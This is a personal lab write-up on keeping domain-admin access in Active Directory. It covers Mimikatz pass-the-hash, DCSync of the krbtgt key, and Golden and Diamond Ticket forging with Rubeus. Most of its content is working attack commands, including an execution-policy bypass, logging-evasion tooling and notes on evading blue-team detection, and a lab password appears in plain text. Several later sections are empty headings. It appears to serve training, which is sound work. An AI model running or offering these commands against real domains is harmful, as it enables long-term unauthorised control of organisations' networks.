## Quelque techiniques de persistence
After gaining domain admin privileges, attackers generaly focus on maintaining their
level of access over time. They employ various persistence techniques that allow them
to regain domain admin privileges whenever they want, potentially for months or even
years. In this lab i will explore:
- Golden Ticket
- Diamond Ticket
- AdminSDHolder
- Remote Services/Protocoles SD


### Golden Ticket
##### dcsync
With the da credentials with start a new process and perform a dcsync attack to extrat the credentials of the krbtgt account (the account of the Key Distribution Center Sservice).<br>
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
powershell -ep bypass
Import-Module C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::pth /user:itmanager /domain:corp.local /rc4:<> /run:cmd.exe" "exit"'
```
![alt text](assets/persistence/pth.png)<br>

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
powershell -ep bypass
Import-Module C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"lsadump::dcsync /user:corp\krbtgt" "exit"'
```
![alt text](assets/persistence/dcsync.png)<br>

##### DA tgt forging using low user
We use  the krbtgt account aes key to forge TGT for any user. Since the krbtgt accound passord is not often change this techique can allow the attacker to maintain his access for long periods...<br>

```powershell
C:\AD\Tools\Rubeus.exe golden /aes256:<> /sid:<> /ldap /user:Administrator /printcmd
```
![alt text](assets/persistence/golden1.png)<br>
![alt text](assets/persistence/golden3.png)<br>
![alt text](assets/persistence/golden4.png)<br>

```powershell
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:<> 
/aes256:<> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
![alt text](assets/persistence/golden2.png)<br>
![alt text](assets/persistence/golden5.png)<br>

### Diamond Ticket
One thing to always remember is that a Golden Ticket is a forged ticket, meaning there is no interaction with the KDC (Key Distribution Center). This can be detected by the Blue Team by monitoring for an AS-REP without a corresponding AS-REQ.<br>
In contrast, the Diamond Ticket is more OPSEC-safe. In this attack, we first request a legitimate TGT (Ticket Granting Ticket) from the KDC. Then, using the krbtgt hash, we decode the TGT, modify it, and re-encode it before using it.


##### using the curent user security context (tgtdeleg)
```powershell
C:\AD\Tools\Rubeus.exe diamond /krbkey:<> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:corp.local /dc:WIN-4E30GDH8UQ6.corp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

##### using user/password
```powershell
C:\AD\Tools\Rubeus.exe -args %Pwn% /krbkey:<> /user:stdent163 /password:UE6pj7HvkSgrGR92 /enctype:aes /ticketuser:administrator /domain:corp.local  /dc:WIN-4E30GDH8UQ6.corp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /pt
```

### AdminSDHolder


### Remote Services/Protocoles SD

##### Remote Registry

##### Remote WMI


##### Powershell Remoting


### DSRM



### Custom Security Support Provider (SSP)


### 